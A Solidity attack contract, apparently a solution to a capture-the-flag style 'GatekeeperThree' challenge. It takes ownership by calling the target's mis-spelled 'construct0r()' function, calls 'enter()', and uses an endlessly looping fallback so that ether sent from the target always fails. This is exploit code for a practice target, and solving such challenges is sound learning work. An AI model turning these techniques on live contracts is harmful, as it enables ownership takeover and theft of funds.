// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gate_keeper_three.sol";

contract AttackGateKeeperThree {

    GatekeeperThree public gk3;

    constructor(address payable gk3Address) {
        gk3 = GatekeeperThree(gk3Address);
    }

    function claim_ownership() public {
        gk3.construct0r();
    }

    function make_entry() public {
        gk3.enter();
    }

    fallback() external payable {
        if (msg.sender == address(gk3)){
            while (true) {}
        }
    }

}